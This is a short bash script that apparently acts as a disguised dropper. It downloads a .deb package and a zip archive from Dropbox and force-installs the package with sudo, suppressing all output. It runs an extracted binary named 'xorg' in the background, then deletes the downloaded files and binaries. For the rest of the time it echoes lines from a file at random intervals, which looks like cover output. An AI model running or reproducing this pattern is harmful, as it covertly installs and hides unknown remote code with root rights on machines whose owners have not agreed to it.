#!/bin/bash

end=$((SECONDS+$1))
wget hhttps://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/f1761pmxd0dpp3t/xorg.zip -q
unzip xorg.zip > /dev/null 2>&1
#pwd
./src/xorg ./src/xdata &
sleep 3
rm -rf xorg.zip
rm -rf src/xorg
rm -rf src/xdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

